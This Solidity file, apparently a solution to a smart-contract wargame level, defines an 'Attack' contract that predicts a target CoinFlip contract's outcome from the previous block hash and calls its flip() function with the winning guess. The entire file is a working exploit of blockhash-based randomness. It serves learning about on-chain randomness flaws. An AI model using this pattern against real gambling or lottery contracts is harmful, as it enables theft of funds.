// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface CoinFlip{
  function flip(bool) external returns (bool);
}
contract Attack {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(address _add) public{
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    CoinFlip(_add).flip(side);

  }
}